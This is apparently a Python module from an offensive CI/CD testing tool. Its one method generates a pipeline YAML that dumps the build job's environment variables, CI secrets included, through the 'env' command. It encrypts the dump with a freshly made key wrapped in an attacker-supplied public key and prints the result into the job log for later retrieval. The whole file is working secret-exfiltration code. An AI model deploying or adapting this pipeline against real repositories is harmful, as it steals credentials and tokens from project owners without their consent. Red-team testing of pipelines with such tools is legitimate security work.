from yaml import dump


class CICDAttack():
    """Class to encapsulate helper methods for attack features.
    """

    @staticmethod
    def create_exfil_yaml(pubkey: str,
                          cmd: str = 'env'):
        yaml_file = {
            'variables': {
                'KEY': pubkey
            },
            'stages': [
                'build'
            ],
            'default': {
                'image': 'alpine'
            },
            'build_a': {
                'stage': 'build',
                'script': [
                    'apk add openssl || true',
                    "openssl rand -base64 24 | tr -d '\\n' > sym.key",
                    '; '.join([
                        "echo -n '$'",
                        "cat sym.key | openssl pkeyutl -encrypt -pubin -inkey <(echo $KEY | base64 -d) | base64 -w 0",
                        "echo -n '$'",
                        f"{cmd} | openssl enc -aes-256-cbc -kfile sym.key -pbkdf2 | base64 -w 0",
                        "echo '$'"
                    ])
                ]
            }
        }

        return dump(yaml_file)
